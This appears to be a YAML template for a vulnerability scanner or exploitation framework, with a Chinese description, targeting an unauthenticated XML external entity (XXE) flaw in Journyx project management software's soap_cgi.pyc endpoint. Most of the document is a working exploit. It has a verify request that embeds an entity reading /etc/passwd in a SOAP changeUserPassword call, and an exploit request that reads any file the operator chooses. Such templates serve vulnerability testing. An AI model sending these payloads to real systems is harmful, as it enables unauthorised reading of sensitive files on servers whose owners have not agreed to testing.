app: Journyx
query: app:"Journyx"
meta:
  name: Journyx项目管理软件 soap_cgi.pyc XXE漏洞
  level: 4
  tags:
  - xxe
  description: |
    Journyx项目管理软件 soap_cgi.pyc 接口存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版
  create_at: "2024-08-13 10:25:13"
  available: true
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /jtcgi/soap_cgi.pyc
          redirect: true
          header:
          - Content-Type: application/xml
          params: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: root
          type: contains
    exploit_steps:
      type: and
      params:
        name: File
        type: input
        value: /etc/passwd
      exploit:
      - request:
          method: POST
          path: /jtcgi/soap_cgi.pyc
          redirect: true
          header:
          - Content-Type: application/xml
          params: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "{{exploit}}">]><soapenv:Envelope
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
        response:
        - name: code
          value: "200"
          type: equals
